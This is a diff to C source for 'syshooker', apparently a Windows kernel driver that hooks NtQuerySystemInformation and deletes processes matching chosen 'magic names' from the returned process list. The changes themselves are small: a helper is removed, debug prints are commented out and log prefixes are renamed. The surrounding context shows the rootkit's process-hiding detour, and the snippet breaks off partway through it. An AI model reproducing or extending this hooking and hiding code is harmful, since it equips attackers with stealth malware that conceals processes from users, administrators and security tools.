@@ -53,17 +53,6 @@ typedef NTSTATUS(*NtQuerySystemInformation_t)(
 static UNICODE_STRING StringNtQuerySystemInformation = RTL_CONSTANT_STRING(L"NtQuerySystemInformation");
 static NtQuerySystemInformation_t OriginalNtQuerySystemInformation = NULL;
 
-ULONG GetLastEntrySize(ULONG ReturnLength, SYSTEM_PROCESS_INFORMATION* CurrentEntry) {
-	ULONG AllEntriesSum = 0;
-	while (CurrentEntry->NextEntryOffset != 0) {
-		AllEntriesSum += CurrentEntry->NextEntryOffset;
-		CurrentEntry = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)CurrentEntry + CurrentEntry->NextEntryOffset); // move forward
-	}
-	ULONG LastEntrySize = ReturnLength - AllEntriesSum;
-	kprintf("[+] syshooker: AllEntriesSum %d, LastEntrySize %d\n", AllEntriesSum, LastEntrySize);
-	return LastEntrySize;
-}
-
 void PrintProcessStructInfo(SYSTEM_PROCESS_INFORMATION* ProcessInformationPtr, ULONG BufferLeftOffset) {
 	WCHAR ProcessNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
 	const wchar_t* RealProcessNameBufferAddr;
@@ -87,7 +76,7 @@ void PrintAllProcessEntries(SYSTEM_PROCESS_INFORMATION* ProcessInformationPtr) {
 }
 
 void FixNameBuffers(SYSTEM_PROCESS_INFORMATION* ProcessInformationPtr, const ULONG LeftOffset) {
-	kprintf("[+] syshooker: FixNameBuffers start, offset: %d...\n", LeftOffset);
+	// kprintf("[+] syshooker: FixNameBuffers start, offset: %d...\n", LeftOffset);
 	while (ProcessInformationPtr->NextEntryOffset != 0) { // last one will be skipped
 		wchar_t* RealProcessNameBufferAddr = (wchar_t*)((PUINT8)(ProcessInformationPtr->ImageName.Buffer) - LeftOffset); // shift value is in bytes, so we retype to PUINT8 to be able to do pointer arithmetic
 
@@ -96,7 +85,7 @@ void FixNameBuffers(SYSTEM_PROCESS_INFORMATION* ProcessInformationPtr, const ULO
 
 		ProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)ProcessInformationPtr + ProcessInformationPtr->NextEntryOffset); // move forward
 	}
-	kprintf("[+] syshooker: FixNameBuffers done fixing addresses.\n");
+	// kprintf("[+] syshooker: FixNameBuffers done fixing addresses.\n");
 }
 
 NTSTATUS DetourNtQuerySystemInformation(
@@ -108,7 +97,7 @@ NTSTATUS DetourNtQuerySystemInformation(
 	NTSTATUS OriginalStatus = OriginalNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
 	
 	if (NT_SUCCESS(OriginalStatus) && SystemInformationClass == SYSHOOKER_SYSTEM_INFORMATION_CLASS_PROCESS) {
-		kprintf("[+] infinityhook: NtQuerySystemInformation: SystemInformationClass: %d\n", SystemInformationClass);
+		kprintf("[+] syshooker: NtQuerySystemInformation: SystemInformationClass: %d\n", SystemInformationClass);
 
         SYSTEM_PROCESS_INFORMATION* ProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)SystemInformation;
 		SYSTEM_PROCESS_INFORMATION* PreviousProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)SystemInformation;
@@ -122,7 +111,7 @@ NTSTATUS DetourNtQuerySystemInformation(
                 wcsncpy(ProcessNameBuffer, ProcessInformationPtr->ImageName.Buffer, MIN(ProcessInformationPtr->ImageName.Length, MAX_PATH_SYSHOOKER-1)); // -1 to ensure that the last char is \0
 
 				if (matchMagicNames(ProcessNameBuffer, (Target)TARGET_PROCESS)) {
-					kprintf("[+] infinityhook: NtQuerySystemInformation: Should hide: %ws\n", ProcessNameBuffer);
+					kprintf("[+] syshooker: NtQuerySystemInformation: Should hide: %ws\n", ProcessNameBuffer);
 					// Not the last process entry
 					if (ProcessInformationPtr->NextEntryOffset > 0) {
 						// we first calculate how many bytes from the next record (current should be deleted) to the end of the buffer
